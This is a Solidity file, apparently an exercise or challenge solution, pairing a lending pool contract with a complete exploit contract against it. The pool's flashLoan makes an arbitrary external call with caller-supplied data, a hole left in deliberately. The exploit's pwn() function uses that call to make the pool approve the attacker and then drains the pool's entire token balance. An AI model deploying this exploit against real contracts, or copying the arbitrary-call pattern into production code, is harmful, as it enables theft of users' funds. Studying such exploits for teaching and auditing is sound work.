// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./IERC20.sol";

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(
        uint256 _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint256 balBefore = token.balanceOf(address(this));
        require(balBefore >= _amount, "borrow amount > balance");

        token.transfer(msg.sender, _amount);
        (bool executed, ) = _target.call(_data);
        require(executed, "loan failed");

        uint256 balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint256 amount,
        address target,
        bytes calldata data
    ) external;
}

interface ILendingPoolToken {
    // ILendingPoolToken is ERC20
    // declare any ERC20 functions that you need to call here
    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
}

contract LendingPoolExploit {
    ILendingPool public pool;
    ILendingPoolToken public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = ILendingPoolToken(pool.token());
    }

    function pwn() external {
        // this function will be called
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        token.transferFrom(address(pool), address(this), bal);
    }
}
